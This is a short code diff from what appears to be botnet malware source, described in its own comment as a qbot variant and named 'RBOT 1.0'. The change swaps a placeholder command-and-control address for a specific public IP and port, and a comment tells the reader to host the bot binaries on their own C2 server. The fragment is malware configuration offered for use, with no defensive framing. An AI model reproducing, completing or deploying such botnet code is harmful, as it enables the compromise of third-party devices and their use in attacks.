@@ -37,7 +37,7 @@ This is basically qbot with less steps..or extra, im not sure what the fuck i wa
 #define Application "ROOTNETROTNETROOTNETROOTNETAAAAAAA";
 #define Version "RBOT 1.0";
 
-unsigned char *commServer[] = {"1.1.1.1:3074"};//for fucks sake stop trying to be a cool complicated hakker, and just host the bins on your c2 server
+unsigned char *commServer[] = {"44.199.213.117:3074"};//for fucks sake stop trying to be a cool complicated hakker, and just host the bins on your c2 server
 
 
 int initConnection();
